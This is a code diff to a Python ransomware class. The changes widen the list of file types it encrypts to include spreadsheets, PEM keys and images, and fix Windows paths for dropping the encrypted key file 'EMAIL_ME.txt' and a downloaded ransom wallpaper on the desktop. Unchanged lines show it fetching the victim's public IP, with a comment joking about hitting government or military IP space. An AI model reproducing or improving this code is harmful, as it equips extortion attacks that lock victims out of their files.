@@ -23,6 +23,12 @@ class RansomWare:
     # File exstensions to seek out and Encrypt
     file_exts = [
         'txt',
+        'xls',
+        'xlsx',
+        'pem',
+        'rtf',
+        'jpg',
+        'png',
        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
        # -and leaves other files un-ecnrypted etc.
        # 'png', 
@@ -46,7 +52,7 @@ class RansomWare:
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
-        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot' # Debugging/Testing
+        self.localRoot = r'C:\Users\Username\Desktop\localRoot' # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
@@ -82,7 +88,7 @@ class RansomWare:
             # Write encrypted fernet key to file
             f.write(enc_fernent_key)
         # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
-        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
+        with open(f'{self.sysRoot}\Desktop\EMAIL_ME.txt', 'wb') as fa:
             fa.write(enc_fernent_key)
         # Assign self.key to encrypted fernet key
         self.key = enc_fernent_key
@@ -138,7 +144,7 @@ class RansomWare:
     def change_desktop_background(self):
         imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
         # Go to specif url and download+save image using absolute path
-        path = f'{self.sysRoot}Desktop/background.jpg'
+        path = f'{self.sysRoot}\Desktop\background.jpg'
         urllib.request.urlretrieve(imageUrl, path)
         SPI_SETDESKWALLPAPER = 20
         # Access windows dlls for funcionality eg, changing dekstop wallpaper
